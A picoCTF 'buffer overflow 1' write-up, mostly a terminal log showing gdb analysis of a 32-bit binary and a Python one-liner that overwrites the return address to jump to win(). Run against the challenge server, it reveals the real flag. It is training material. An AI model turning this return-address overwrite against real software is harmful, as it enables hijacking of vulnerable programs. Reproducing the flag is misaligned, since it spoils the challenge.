## Descripción 
```
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 50034`
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ wget https://artifacts.picoctf.net/c/185/vuln
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ wget https://artifacts.picoctf.net/c/185/vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ ./vuln
-bash: ./vuln: Permission denied
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp$ chmod +x vuln
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ ls -la
total 28
drwxr-xr-x 2 porti_04 porti_04  4096 Nov 14 12:21 .
drwxr-xr-x 3 porti_04 porti_04  4096 Nov 14 11:58 ..
-rwxr-xr-x 1 porti_04 porti_04 15704 Aug  4  2023 vuln
-rw-r--r-- 1 porti_04 porti_04   769 Aug  4  2023 vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ fc -p
-bash: fc: -p: invalid option
fc: usage: fc [-e ename] [-lnr] [first] [last] or fc -s [pat=rep] [command]
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ echo "picoCTF{dummie_flag}" > flag.txt
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ ls -la
total 32
drwxr-xr-x 2 porti_04 porti_04  4096 Nov 14 12:29 .
drwxr-xr-x 3 porti_04 porti_04  4096 Nov 14 11:58 ..
-rw-r--r-- 1 porti_04 porti_04    21 Nov 14 12:29 flag.txt
-rwxr-xr-x 1 porti_04 porti_04 15704 Aug  4  2023 vuln
-rw-r--r-- 1 porti_04 porti_04   769 Aug  4  2023 vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ cat flag.txt
picoCTF{dummie_flag}
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ ./vuln
Please enter your string:
hola como estas
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
--Type <RET> for more, q to quit, c to continue without paging--c
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
(gdb) dissasemble main
Undefined command: "dissasemble".  Try "help".
(gdb) disassemble main
Dump of assembler code for function main:
   0x080492c4 <+0>:     endbr32
   0x080492c8 <+4>:     lea    0x4(%esp),%ecx
   0x080492cc <+8>:     and    $0xfffffff0,%esp
   0x080492cf <+11>:    push   -0x4(%ecx)
   0x080492d2 <+14>:    push   %ebp
   0x080492d3 <+15>:    mov    %esp,%ebp
   0x080492d5 <+17>:    push   %ebx
   0x080492d6 <+18>:    push   %ecx
   0x080492d7 <+19>:    sub    $0x10,%esp
   0x080492da <+22>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492df <+27>:    add    $0x2d21,%ebx
   0x080492e5 <+33>:    mov    -0x4(%ebx),%eax
   0x080492eb <+39>:    mov    (%eax),%eax
   0x080492ed <+41>:    push   $0x0
   0x080492ef <+43>:    push   $0x2
   0x080492f1 <+45>:    push   $0x0
   0x080492f3 <+47>:    push   %eax
   0x080492f4 <+48>:    call   0x80490b0 <setvbuf@plt>
   0x080492f9 <+53>:    add    $0x10,%esp
   0x080492fc <+56>:    call   0x8049070 <getegid@plt>
   0x08049301 <+61>:    mov    %eax,-0xc(%ebp)
   0x08049304 <+64>:    sub    $0x4,%esp
   0x08049307 <+67>:    push   -0xc(%ebp)
   0x0804930a <+70>:    push   -0xc(%ebp)
   0x0804930d <+73>:    push   -0xc(%ebp)
--Type <RET> for more, q to quit, c to continue without paging--exit
   0x08049310 <+76>:    call   0x80490d0 <setresgid@plt>
   0x08049315 <+81>:    add    $0x10,%esp
   0x08049318 <+84>:    sub    $0xc,%esp
   0x0804931b <+87>:    lea    -0x1f60(%ebx),%eax
   0x08049321 <+93>:    push   %eax
   0x08049322 <+94>:    call   0x8049080 <puts@plt>
   0x08049327 <+99>:    add    $0x10,%esp
   0x0804932a <+102>:   call   0x8049281 <vuln>
   0x0804932f <+107>:   mov    $0x0,%eax
   0x08049334 <+112>:   lea    -0x8(%ebp),%esp
   0x08049337 <+115>:   pop    %ecx
   0x08049338 <+116>:   pop    %ebx
   0x08049339 <+117>:   pop    %ebp
   0x0804933a <+118>:   lea    -0x4(%ecx),%esp
   0x0804933d <+121>:   ret
End of assembler dump.
(gdb) exit
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write('A'*32)"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
TypeError: a bytes-like object is required, not 'str'
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*32)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAporti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ ./vuln
Please enter your string:
^C
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*32)" |
./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*48)" |
./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
Segmentation fault (core dumped)
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44)" |
./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
Segmentation fault (core dumped)
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
--Type <RET> for more, q to quit, c to continue without paging--eixt
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{dummie_flag}
Segmentation fault (core dumped)
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\0x08')" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x491f6
Segmentation fault (core dumped)
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\
x08')" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{dummie_flag}
Segmentation fault (core dumped)
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | nc saturn.picoctf.net 52220
Please enter your string:
1
^C
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ (python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo | nc saturn.picoctf.net 52220
> ^C
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo1$ (python3 -c  "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 52220
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}

flag: picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales

[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias